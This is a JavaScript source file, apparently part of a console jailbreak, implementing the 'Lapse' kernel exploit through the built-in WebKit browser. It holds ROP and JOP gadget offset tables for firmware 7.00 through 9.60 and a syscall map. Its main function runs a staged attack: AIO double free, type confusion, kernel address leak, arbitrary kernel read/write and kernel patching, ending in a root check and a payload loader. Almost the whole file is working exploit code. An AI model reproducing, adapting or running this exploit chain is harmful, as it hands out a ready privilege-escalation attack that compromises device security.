        'pthread_create': 0x1c540,
        'pthread_join': 0x9560,
        'pthread_barrier_init': 0x24200,
        'pthread_barrier_wait': 0x1efb0,
        'pthread_barrier_destroy': 0x19450,
        'pthread_exit': 0x28ca0
      }));
      break;
    default:
      throw "Unsupported firmware";
  }
  // ROP offsets
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      off_ta_vt = 0x23ba070;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ad0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x50a00;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001fa68, // `58 c3`
        "pop rbx; ret": 0x0000000000028cfa, // `5b c3`
        "pop rcx; ret": 0x0000000000026afb, // `59 c3`
        "pop rdx; ret": 0x0000000000052b23, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c987, // `5e c3`
        "pop rdi; ret": 0x000000000000835d, // `5f c3`
        "pop rsp; ret": 0x0000000000078c62, // `5c c3`
        "pop r8; ret": 0x00000000005f5500, // `41 58 c3`
        "pop r9; ret": 0x00000000005c6a81, // `47 59 c3`
        "pop r10; ret": 0x0000000000061671, // `47 5a c3`
        "pop r11; ret": 0x0000000000d4344f, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da462c, // `41 5c c3`
        "pop r13; ret": 0x00000000019daaeb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c986, // `41 5e c3`
        "pop r15; ret": 0x000000000024be8c, // `41 5f c3`
      
        "ret": 0x000000000000003c, // `c3`
        "leave; ret": 0x00000000000f2c93, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e852, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x00000000000203e9, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000020148, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000294dcc, // `89 30 c3`
      
        [jop8]: 0x00000000019c2500, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000007776e0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f84031, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001e25cce, // `52 ff 20`
        [jop7]: 0x0000000000078c62, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x277c4, "setcontext": 0x2bc18 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x161f0 }));
      Chain = Chain700_852;
      break;
    case 0x750:
    case 0x751:
    case 0x755:
      off_ta_vt = 0x23ae2b0;
      off_wk_stack_chk_fail = 0x2438;
      off_scf = 0x12ac0;
      off_wk_strlen = 0x2478;
      off_strlen = 0x4f580;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000003650b, // `58 c3`
        "pop rbx; ret": 0x0000000000015d5c, // `5b c3`
        "pop rcx; ret": 0x000000000002691b, // `59 c3`
        "pop rdx; ret": 0x0000000000061d52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003c827, // `5e c3`
        "pop rdi; ret": 0x000000000024d2b0, // `5f c3`
        "pop rsp; ret": 0x000000000005f959, // `5c c3`
        "pop r8; ret": 0x00000000005f99e0, // `41 58 c3`
        "pop r9; ret": 0x000000000070439f, // `47 59 c3`
        "pop r10; ret": 0x0000000000061d51, // `47 5a c3`
        "pop r11; ret": 0x0000000000d492bf, // `4f 5b c3`
        "pop r12; ret": 0x0000000000da945c, // `41 5c c3`
        "pop r13; ret": 0x00000000019ccebb, // `41 5d c3`
        "pop r14; ret": 0x000000000003c826, // `41 5e c3`
        "pop r15; ret": 0x000000000024d2af, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000025654b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002e592, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005becb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000201c4, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002951bc, // `89 30 c3`
      
        [jop8]: 0x00000000019b4c80, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000077b420, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f87995, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001f1c866, // `52 ff 20`
        [jop7]: 0x000000000005f959, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25f34, "setcontext": 0x2a388 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x16220 }));
      Chain = Chain700_852;
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x12a30;
      off_wk_strlen = 0x918;
      off_strlen = 0x4eb80;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000035a1b, // `58 c3`
        "pop rbx; ret": 0x000000000001537c, // `5b c3`
        "pop rcx; ret": 0x0000000000025ecb, // `59 c3`
        "pop rdx; ret": 0x0000000000060f52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000003bd77, // `5e c3`
        "pop rdi; ret": 0x00000000001e3f87, // `5f c3`
        "pop rsp; ret": 0x00000000000bf669, // `5c c3`
        "pop r8; ret": 0x00000000005ee860, // `41 58 c3`
        "pop r9; ret": 0x00000000006f501f, // `47 59 c3`
        "pop r10; ret": 0x0000000000060f51, // `47 5a c3`
        "pop r11; ret": 0x00000000013cad93, // `41 5b c3`
        "pop r12; ret": 0x0000000000d8968d, // `41 5c c3`
        "pop r13; ret": 0x00000000019a0edb, // `41 5d c3`
        "pop r14; ret": 0x000000000003bd76, // `41 5e c3`
        "pop r15; ret": 0x00000000002499df, // `41 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000291fd7, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000002dc62, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000005b1bb, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000001f864, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000002915bc, // `89 30 c3`
      
        [jop8]: 0x0000000001988320, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x000000000076b970, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x0000000000f62f95, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x0000000001ef0d16, // `52 ff 20`
        [jop7]: 0x00000000000bf669, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x258f4, "setcontext": 0x29c58 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x160c0 }));
      Chain = Chain700_852;
      break;
    case 0x850:
    case 0x852:
      off_ta_vt = 0x236d4a0;
      off_wk_stack_chk_fail = 0x8d8;
      off_scf = 0x153c0;
      off_wk_strlen = 0x918;
      off_strlen = 0x4ef40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x000000000001ac7b, // `58 c3`
        "pop rbx; ret": 0x000000000000c46d, // `5b c3`
        "pop rcx; ret": 0x000000000001ac5f, // `59 c3`
        "pop rdx; ret": 0x0000000000282ea2, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000050878, // `5e c3`
        "pop rdi; ret": 0x0000000000091afa, // `5f c3`
        "pop rsp; ret": 0x0000000000073c2b, // `5c c3`
        "pop r8; ret": 0x000000000003b4b3, // `47 58 c3`
        "pop r9; ret": 0x00000000010f372f, // `47 59 c3`
        "pop r10; ret": 0x0000000000b1a721, // `47 5a c3`
        "pop r11; ret": 0x0000000000eaba69, // `4f 5b c3`
        "pop r12; ret": 0x0000000000eaf80d, // `47 5c c3`
        "pop r13; ret": 0x00000000019a0d8b, // `41 5d c3`
        "pop r14; ret": 0x0000000000050877, // `41 5e c3`
        "pop r15; ret": 0x00000000007e2efd, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000001ba53, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000003734c, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000001433b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x0000000000008e7f, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x0000000000cf6c22, // `89 30 c3`
      
        [jop8]: 0x00000000019881d0, // `48 8b 7e 08 48 8b 07 ff 60 70`
        [jop9]: 0x00000000011c9df0, // `55 48 89 e5 48 8b 07 ff 50 30`
        [jop10]: 0x000000000126c9c5, // `48 8b 52 50 b9 0a 00 00 00 ff 50 40`
        [jop6]: 0x00000000021f3a2e, // `52 ff 20`
        [jop7]: 0x0000000000073c2b, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x25904, "setcontext": 0x29c38 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0x10750 }));
      Chain = Chain700_852;
      break;
    case 0x900:
    case 0x903:
    case 0x904:
      off_ta_vt = 0x2e73c18;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x1ff60;
      off_wk_strlen = 0x198;
      off_strlen = 0x4fa40;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000051a12, // `58 c3`
        "pop rbx; ret": 0x00000000000be5d0, // `5b c3`
        "pop rcx; ret": 0x00000000000657b7, // `59 c3`
        "pop rdx; ret": 0x000000000000986c, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x000000000001f4d6, // `5e c3`
        "pop rdi; ret": 0x0000000000319690, // `5f c3`
        "pop rsp; ret": 0x000000000004e293, // `5c c3`
        "pop r8; ret": 0x00000000001a7ef1, // `47 58 c3`
        "pop r9; ret": 0x0000000000422571, // `47 59 c3`
        "pop r10; ret": 0x0000000000e9e1d1, // `47 5a c3`
        "pop r11; ret": 0x00000000012b1d51, // `47 5b c3`
        "pop r12; ret": 0x000000000085ec71, // `47 5c c3`
        "pop r13; ret": 0x00000000001da461, // `47 5d c3`
        "pop r14; ret": 0x0000000000685d73, // `47 5e c3`
        "pop r15; ret": 0x00000000006ab3aa, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x000000000008db5b, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x00000000000241cc, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x000000000000613b, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x000000000000613c, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x00000000005c3482, // `89 30 c3`
      
        [jop1]: 0x00000000004e62a4,
        [jop2]: 0x00000000021fce7e,
        [jop3]: 0x00000000019becb4,
      
        [jop4]: 0x0000000000683800,
        [jop5]: 0x0000000000303906,
        [jop6]: 0x00000000028bd332,
        [jop7]: 0x000000000004e293,
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x24f04, "setcontext": 0x29448 }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xcb80 }));
      Chain = Chain900_960;
      break;
    case 0x950:
    case 0x951:
    case 0x960:
      off_ta_vt = 0x2ebea68;
      off_wk_stack_chk_fail = 0x178;
      off_scf = 0x28870;
      off_wk_strlen = 0x198;
      off_strlen = 0x4c040;
      webkit_gadget_offsets = new Map(Object.entries({
        "pop rax; ret": 0x0000000000011c46, // `58 c3`
        "pop rbx; ret": 0x0000000000013730, // `5b c3`
        "pop rcx; ret": 0x0000000000035a1e, // `59 c3`
        "pop rdx; ret": 0x000000000018de52, // `5a c3`
        "pop rbp; ret": 0x00000000000000b6, // `5d c3`
        "pop rsi; ret": 0x0000000000092a8c, // `5e c3`
        "pop rdi; ret": 0x000000000005d19d, // `5f c3`
        "pop rsp; ret": 0x00000000000253e0, // `5c c3`
        "pop r8; ret": 0x000000000003fe32, // `47 58 c3`
        "pop r9; ret": 0x0000000000aaad51, // `47 59 c3`
        "pop r11; ret": 0x0000000001833a21, // `47 5b c3`
        "pop r12; ret": 0x0000000000420ad1, // `47 5c c3`
        "pop r13; ret": 0x00000000018fc4c1, // `47 5d c3`
        "pop r14; ret": 0x000000000028c900, // `41 5e c3`
        "pop r15; ret": 0x0000000001437c8a, // `47 5f c3`
      
        "ret": 0x0000000000000032, // `c3`
        "leave; ret": 0x0000000000056322, // `c9 c3`
      
        "mov rax, qword ptr [rax]; ret": 0x000000000000c671, // `48 8b 00 c3`
        "mov qword ptr [rdi], rax; ret": 0x0000000000010c07, // `48 89 07 c3`
        "mov dword ptr [rdi], eax; ret": 0x00000000000071d0, // `89 07 c3`
        "mov dword ptr [rax], esi; ret": 0x000000000007ebd8, // `89 30 c3`
      
        [jop1]: 0x000000000060fd94, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
        [jop11]: 0x0000000002bf3741, // `5e f5 ff 60 7c`
        [jop3]: 0x000000000181e974, // `48 8b 78 08 48 8b 07 ff 60 30`
      
        [jop4]: 0x00000000001a75a0, // `55 48 89 e5 48 8b 07 ff 50 58`
        [jop5]: 0x000000000035fc94, // `48 8b 50 18 48 8b 07 ff 50 10`
        [jop6]: 0x00000000002b7a9c, // `52 ff 20`
        [jop7]: 0x00000000000253e0, // `5c c3`
      }));
      libc_gadget_offsets = new Map(Object.entries({ "getcontext": 0x21284, "setcontext": 0x254dc }));
      libkernel_gadget_offsets = new Map(Object.entries({ "__error": 0xbb60 }));
      Chain = Chain900_960;
      break;
    default:
      throw "Unsupported firmware";
  }
  syscall_array = [];
  libwebkit_base = null;
  libkernel_base = null;
  libc_base = null;
  gadgets = new Map();
  chain = null;
  nogc = [];
  syscall_map = new Map(Object.entries({
    'read': 3,
    'write': 4,
    'open': 5,
    'close': 6,
    'getpid': 20,
    'setuid': 23,
    'getuid': 24,
    'accept': 30,
    'pipe': 42,
    'ioctl': 54,
    'munmap': 73,
    'mprotect': 74,
    'fcntl': 92,
    'socket': 97,
    'connect': 98,
    'bind': 104,
    'setsockopt': 105,
    'listen': 106,
    'getsockopt': 118,
    'fchmod': 124,
    'socketpair': 135,
    'fstat': 189,
    'getdirentries': 196,
    '__sysctl': 202,
    'mlock': 203,
    'munlock': 204,
    'clock_gettime': 232,
    'nanosleep': 240,
    'sched_yield': 331,
    'kqueue': 362,
    'kevent': 363,
    'rtprio_thread': 466,
    'mmap': 477,
    'ftruncate': 480,
    'shm_open': 482,
    'cpuset_getaffinity': 487,
    'cpuset_setaffinity': 488,
    'jitshm_create': 533,
    'jitshm_alias': 534,
    'evf_create': 538,
    'evf_delete': 539,
    'evf_set': 544,
    'evf_clear': 545,
    'set_vm_container': 559,
    'dmem_container': 586,
    'dynlib_dlsym': 591,
    'dynlib_get_list': 592,
    'dynlib_get_info': 593,
    'dynlib_load_prx': 594,
    'randomized_path': 602,
    'budget_get_ptype': 610,
    'thr_suspend_ucontext': 632,
    'thr_resume_ucontext': 633,
    'blockpool_open': 653,
    'blockpool_map': 654,
    'blockpool_unmap': 655,
    'blockpool_batch': 657,
    // syscall 661 is unimplemented so free for use. a kernel exploit will
    // install "kexec" here
    'aio_submit': 661,
    'kexec': 661,
    'aio_multi_delete': 662,
    'aio_multi_wait': 663,
    'aio_multi_poll': 664,
    'aio_multi_cancel': 666,
    'aio_submit_cmd': 669,
    'blockpool_move': 673
  }));
  return 1;
}
//================================================================================================
// Cleanup Function ========================================================================
//================================================================================================
var block_fd, unblock_fd, current_core, current_rtprio, current_core_stored;
var sds, block_id, groom_ids, pktopts_sds, dirty_sd, sd_pair_main;
//================================================================================================
function doCleanup() {
  if (unblock_fd !== -1) {
    try {
      close(unblock_fd);
    } catch (e) {}
    unblock_fd = -1;
  }
  if (block_fd !== -1) {
    try {
      close(block_fd);
    } catch (e) {}
    block_fd = -1;
  }
  if (groom_ids !== null) {
    try {
      free_aios2(groom_ids.addr, groom_ids.length);
    } catch (e) {}
    groom_ids = null;
  }
  if (block_id !== 0xffffffff) {
    try {
      aio_multi_wait(block_id.addr, 1);
    } catch(e) {}
    try {
      aio_multi_delete(block_id.addr, block_id.length);
    } catch(e) {}
    block_id = 0xffffffff;
  }
  if (sds !== null) {
    for (const sd of sds) {
      try {
        close(sd);
      } catch(e) {}
    }
    sds = null;
  }
  if (pktopts_sds !== null) {
    for (const psd of pktopts_sds) {
      try {
        close(psd);
      } catch(e) {}
    }
  }
//  if (sd_pair_main !== null) {
//    try {
//      close(sd_pair_main[0]);
//    } catch(e) {}
//    try {
//      close(sd_pair_main[1]);
//    } catch(e) {}
//    sd_pair_main = null;
//  }
  if (current_core_stored > 0) {
    // Restore the thread's CPU core and realtime priority to maintain system stability during the exploit.
    // Stability tweaks from Al-Azif's source
    //log(`restoring core: ${current_core}`);
    //log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
    pin_to_core(current_core);
    set_rtprio(current_rtprio);
  }
}
//================================================================================================
// Lapse Exploit Function ========================================================================
//================================================================================================
async function doLapseExploit() {
  // overview:
  // * double free a aio_entry (resides at a 0x80 malloc zone)
  // * type confuse a evf and a ip6_rthdr
  // * use evf/rthdr to read out the contents of the 0x80 malloc zone
  // * leak a address in the 0x100 malloc zone
  // * write the leaked address to a aio_entry
  // * double free the leaked address
  // * corrupt a ip6_pktopts for restricted r/w
  // * corrupt a pipe for arbitrary r/w
  //
  // the exploit implementation also assumes that we are pinned to one core
  current_core_stored = 0;
  block_fd = -1;
  unblock_fd = -1;
  groom_ids = null;
  block_id = 0xffffffff;
  sds = null;
  pktopts_sds = null;
  sd_pair_main = null;
  try {
    var jb_step_status;
    jb_step_status = Init_LapseGlobals();
    if (jb_step_status !== 1) {
      window.log("Global variables not properly initialized. Please restart console and try again...", "red");
      return 0;
    }
    await lapse_init();
    // Save the thread's CPU core and realtime priority to maintain system stability during the exploit.
    // Stability tweaks from Al-Azif's source
    current_core = get_current_core();
    current_rtprio = get_current_rtprio();
    current_core_stored = 1;
    //log(`current core: ${current_core}`);
    //log(`current rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
    // if the first thing you do since boot is run the web browser, WebKit can
    // use all the cores
    const main_mask = new Buffer(sizeof_cpuset_t_);
    //const main_mask = new Long();
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    // pin to 1 core so that we only use 1 per-cpu bucket. this will make heap
    // spraying and grooming easier
    //log(`pinning process to core #${main_core}`);
    pin_to_core(main_core);
    //set_cpu_affinity(new Long(1 << main_core));
    get_cpu_affinity(main_mask);
    //log(`main_mask: ${main_mask}`);
    //log("setting main thread's priority");
    set_rtprio({ type: RTP_PRIO_REALTIME, prio: 0x100 });
    //sysi('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
    [block_fd, unblock_fd] = (() => {
      const unix_pair = new View4(2);
      sysi('socketpair', AF_UNIX, SOCK_STREAM, 0, unix_pair.addr);
      return unix_pair;
    })();
    sds = [];
    for (var i = 0; i < num_sds; i++) {
      sds.push(new_socket());
    }
    try {
      if (sysi("setuid", 0) == 0) {
        window.log("\nAlready jailbroken, no need to re-jailbrake", "green");
        runBinLoader();
        return 0;
      }
    }
    catch (error) {
      //window.log("\nAn error occured during if jailbroken test: " + error, "red");
    }
    window.log('Lapse Setup');
    await sleep(50); // Wait 50ms
    [block_id, groom_ids] = setup(block_fd);
    window.log('Lapse STAGE 1/5: Double free AIO queue entry');
    await sleep(50); // Wait 50ms
    sd_pair_main = double_free_reqs2(sds);
    window.log('Lapse STAGE 2/5: Leak kernel addresses');
    await sleep(50); // Wait 50ms
    const [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf] = leak_kernel_addrs(sd_pair_main);
    window.log('Lapse STAGE 3/5: Double free SceKernelAioRWRequest');
    await sleep(50); // Wait 50ms
    [pktopts_sds, dirty_sd] = double_free_reqs1(reqs1_addr, kbuf_addr, target_id, evf, sd_pair_main[0], sds);
    window.log('Lapse STAGE 4/5: Get arbitrary kernel read/write');
    await sleep(50); // Wait 50ms
    const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
    window.log('Lapse STAGE 5/5: Patch kernel');
    await sleep(50); // Wait 50ms
    await patch_kernel(kbase, kmem, p_ucred, restore_info);
    doCleanup();
    // Check if it all worked
    try {
      if (sysi('setuid', 0) == 0) {
        window.log("\nKernel exploit succeeded and AIO fixes applied", "green");
        return 1;
      } else {
        window.log("An error occured during Lapse\nPlease restart console and try again...", "red");
      }
    } catch {
      // Still not exploited, something failed, but it made it here...
      die("kernel exploit failed!");
    }
  } catch (error) {
    window.log("An error occured during Lapse\nPlease restart console and try again...\nError definition: " + error, "red");
    doCleanup();
  }
  return 0;
}
//================================================================================================
window.script_loaded = 1;
